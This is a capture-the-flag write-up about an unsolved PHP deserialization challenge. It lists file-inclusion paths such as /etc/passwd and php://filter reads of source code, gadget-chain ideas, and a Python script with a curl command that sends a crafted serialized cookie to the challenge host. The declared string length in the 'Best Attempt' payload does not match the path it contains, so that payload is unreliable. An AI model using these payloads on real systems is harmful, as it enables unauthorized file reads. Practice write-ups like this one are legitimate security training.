# 9. Gestor de Respaldos Capybara

**Category**: Web  
**Difficulty**: HARD  
**Points**: 500  

## Description

> El Capybara Backup Manager guarda las preferencias del usuario en una cookie. Investiga cómo se personaliza la aplicación (hay documentación sobre cómo cambiar el tema) y revisa el código fuente de la página con atención. Encuentra la forma de que el gestor te entregue un secreto que debería estar fuera de tu alcance.
>
> URL: http://192.99.247.166:8085/
>
> **Flag format:** `EVIL{...}`

## Status: UNSOLVED

## Reconnaissance

The application sets a `pref` cookie containing a base64-encoded serialized PHP object:

```
pref=TzoxMjoiUHJlZmVyZW5jaWFzIjoyOntzOjQ6InRlbWEiO3M6Njoib3NjdXJvIjtzOjk6InBsYW50aWxsYSI7Tjt9
```

Decoded:
```
O:12:"Preferencias":2:{s:4:"tema";s:6:"oscuro";s:9:"plantilla";N;}
```

The `/preferencias.php` page documents the format:
- Preferences stored in `pref` cookie or `?pref=` parameter
- Serialized `Preferencias` object with `serialize()` + `base64_encode()`
- Properties: `tema` (theme: "claro"/"oscuro") and `plantilla` (template, null by default)

The HTML source contains a suspicious comment: `<!--AGENT-CAPYBARA-MARO-->`

Deserialization occurs in `/var/www/html/public/index.php:29` (revealed via Phar deserialization error).

## Analysis

This is a PHP deserialization challenge. The `Preferencias` class has a `plantilla` property that defaults to `null`. The challenge hints at:
1. "Investiga cómo se personaliza la aplicación" - check `/preferencias.php`
2. "Revisa el código fuente con atención" - the `<!--AGENT-CAPYBARA-MARO-->` comment
3. "Entregue un secreto fuera de tu alcance" - likely file read via LFI

The `plantilla` property is a prime candidate for file inclusion via `__destruct()`, `__wakeup()`, or `__toString()` magic methods.

## Attempts Made

### 1. Direct LFI via `plantilla` property
Tested various payloads:
- `/etc/passwd`, `/flag`, `/flag.txt`, `/var/www/html/flag.php`
- `php://filter/convert.base64-encode/resource=/etc/passwd`
- `phar:///flag`
- Path traversal: `../flag`, `../../flag`, `templates/../flag`

All returned the normal page without flag leakage.

### 2. Alternative class injection
- `SplFileObject` with file property
- `stdClass` with plantilla property
- Non-existent classes (fallback to default)
- Namespace path traversal attempts

### 3. Magic method exploitation
- Recursive references (`r:1`, `r:2`)
- Null byte injection
- Long string payloads

### 4. Header/User-Agent manipulation
- `User-Agent: AGENT-CAPYBARA-MARO`
- `X-Agent: CAPYBARA-MARO`
- `X-Capybara: MARO`

### 5. Known gadget chains
- Monolog\Logger
- GuzzleHttp\Client
- Phar (blocked: "Unserialization of 'Phar' is not allowed")

### 6. Source code reading attempts
- `php://filter` to read `index.php` and `Preferencias.php`
- Backup file enumeration (404)
- `.git`, `.bak`, `~` files (404)

## Hypothesis

The `plantilla` property is likely used in a `__destruct()` method that performs `include $this->plantilla` or similar, but:
- Output may be buffered and discarded
- Inclusion may happen after HTML output
- The flag may be in a non-standard location
- Additional conditions may be required (specific User-Agent, header, etc.)

The `<!--AGENT-CAPYBARA-MARO-->` comment remains the strongest unexplored clue. "MARO" may reference:
- A specific PHP gadget chain or technique
- An acronym for Magic/Autoload/Reflection/Object
- A required header/parameter value

## Best Attempt

```bash
# Most promising payload - php://filter to read index.php
python3 -c "
import base64
payload = 'O:12:\"Preferencias\":2:{s:4:\"tema\";s:6:\"oscuro\";s:9:\"plantilla\";s:66:\"php://filter/convert.base64-encode/resource=/var/www/html/public/index.php\";}'
print(base64.b64encode(payload.encode()).decode())
"
# TzoxMjoiUHJlZmVyZW5jaWFzIjoyOntzOjQ6InRlbWEiO3M6Njoib3NjdXJvIjtzOjk6InBsYW50aWxsYSI7czo2NjoicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0vdmFyL3d3dy9odG1sL3B1YmxpYy9pbmRleC5waHAiO30=

curl -s "http://192.99.247.166:8085/?pref=<payload>"
# No flag in response
```

## Next Steps

- Investigate `MARO` hint further (possible custom gadget chain)
- Check if `plantilla` output appears in response headers or cookies
- Explore if backup creation/restore functionality exists but is hidden
- Consider that flag may be in `/flag` at filesystem root (not web root)
- Try time-based blind detection of file inclusion

## Flag

Not obtained.

## Key Takeaways (Partial)

- PHP deserialization with custom classes requires understanding magic methods
- `plantilla` (template) property strongly suggests file inclusion vector
- Source code comments can contain critical hints (`AGENT-CAPYBARA-MARO`)
- Phar deserialization is often blocked in modern CTF challenges
- Base64 + serialize is a common pattern for cookie-based object storage

## References

- PHP Deserialization: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-deserialization
- PHPGGC: https://github.com/ambionics/phpggc
- OWASP Deserialization: https://owasp.org/www-community/vulnerabilities/Deserialization